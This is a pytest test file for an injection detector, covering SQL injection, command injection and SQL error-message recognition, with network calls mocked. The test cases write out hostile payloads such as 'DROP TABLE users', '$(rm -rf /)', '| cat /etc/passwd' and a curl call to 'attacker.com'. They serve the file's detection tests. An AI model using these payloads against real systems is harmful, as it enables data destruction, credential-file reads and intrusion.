import pytest
from .injectionTrial import InjectionDetector
import requests
from requests.exceptions import RequestException
from unittest.mock import patch, MagicMock

@pytest.fixture
def detector():
    return InjectionDetector()

def test_detect_sql_injection_basic(detector):
    # Test basic SQL injection patterns
    test_cases = [
        ("admin' OR 1=1 --", True),
        ("SELECT * FROM users", True),
        ("DROP TABLE users", True),
        ("'; DROP TABLE users --", True),
        ("1; WAITFOR DELAY '0:0:10'--", True),
        ("normal input", False),
        ("12345", False),
        ("", False)
    ]
    
    for input_str, expected in test_cases:
        findings = detector.detect_sql_injection(input_str)
        if expected:
            assert len(findings) > 0, f"Should detect SQL injection in: {input_str}"
        else:
            assert len(findings) == 0, f"Should not detect SQL injection in: {input_str}"

def test_detect_command_injection_basic(detector):
    # Test basic command injection patterns
    test_cases = [
        ("; ls -la", True),
        ("| cat /etc/passwd", True),
        ("$(rm -rf /)", True),
        ("`whoami`", True),
        ("normal input", False),
        ("echo hello", False),  # Without injection characters
        ("", False)
    ]
    
    for input_str, expected in test_cases:
        findings = detector.detect_command_injection(input_str)
        if expected:
            assert len(findings) > 0, f"Should detect command injection in: {input_str}"
        else:
            assert len(findings) == 0, f"Should not detect command injection in: {input_str}"

def test_test_sql_injection_vulnerability_with_mock(detector):
    # Mock requests.get to test without real network calls
    with patch('requests.get') as mock_get:
        # Test case where no vulnerability is found
        mock_response = MagicMock()
        mock_response.text = "Normal page content"
        mock_get.return_value = mock_response
        
        results = detector.test_sql_injection_vulnerability("http://example.com", {"id": "1"})
        assert "No obvious SQL injection vulnerabilities" in results[0]
        
        # Test case where SQL error is detected
        mock_response_vuln = MagicMock()
        mock_response_vuln.text = "Error: You have an error in your SQL syntax"
        mock_get.return_value = mock_response_vuln
        
        results = detector.test_sql_injection_vulnerability("http://example.com", {"id": "1"})
        assert "Potential SQL injection vulnerability" in results[0]
        
        # Test case where request fails
        mock_get.side_effect = RequestException("Connection error")
        results = detector.test_sql_injection_vulnerability("http://example.com", {"id": "1"})
        assert "Error testing payload" in results[0]

def test_sql_error_messages_detection(detector):
    # Test various SQL error message patterns
    test_cases = [
        ("MySQL server version", True),
        ("ORA-12541: TNS:no listener", True),
        ("PostgreSQL query failed", True),
        ("Microsoft OLE DB Provider", True),
        ("SQLiteException: near", True),
        ("Normal page content", False),
        ("", False)
    ]
    
    with patch('requests.get') as mock_get:
        for error_msg, expected in test_cases:
            mock_response = MagicMock()
            mock_response.text = error_msg
            mock_get.return_value = mock_response
            
            results = detector.test_sql_injection_vulnerability("http://example.com", {"id": "1"})
            if expected:
                assert any("Potential SQL injection vulnerability" in r for r in results)
            else:
                assert any("No obvious SQL injection vulnerabilities" in r for r in results)

def test_command_injection_edge_cases(detector):
    # Test edge cases and tricky command injection patterns
    test_cases = [
        ("%0Acat%20/etc/passwd", True),  # URL encoded newline
        ("';$(curl attacker.com)", True),  # Mixed SQL and command injection
        ("127.0.0.1; ping -c 1 localhost", True),
        ("normal input with spaces", False),
        ("var=value", False),
        ("<script>alert(1)</script>", False)  # XSS, not command injection
    ]
    
    for input_str, expected in test_cases:
        findings = detector.detect_command_injection(input_str)
        if expected:
            assert len(findings) > 0, f"Should detect command injection in: {input_str}"
        else:
            assert len(findings) == 0, f"Should not detect command injection in: {input_str}"

def test_sql_injection_evasion_techniques(detector):
    # Test SQL injection patterns that try to evade detection
    test_cases = [
        ("admin'/**/OR/**/'1'='1", True),
        ("SEL" + "ECT * FROM users", True),  # Obfuscation
        ("EXEC('SELECT * FROM users')", True),
        ("UNION%20SELECT%20null,null,null--", True),  # URL encoded
        ("1' AND@var=@var", True),  # Using variables
        ("normal input with spaces", False)
    ]
    
    for input_str, expected in test_cases:
        findings = detector.detect_sql_injection(input_str)
        if expected:
            assert len(findings) > 0, f"Should detect SQL injection in: {input_str}"
        else:
            assert len(findings) == 0, f"Should not detect SQL injection in: {input_str}"

@pytest.mark.parametrize("payload,expected", [
    ("' OR '1'='1", True),
    ("\" OR \"\"=\"", True),
    ("1' ORDER BY 1--", True),
    ("1 AND 1=1", True),
    ("normal input", False)
])
def test_sql_payload_detection(detector, payload, expected):
    findings = detector.detect_sql_injection(payload)
    assert (len(findings) > 0) == expected



   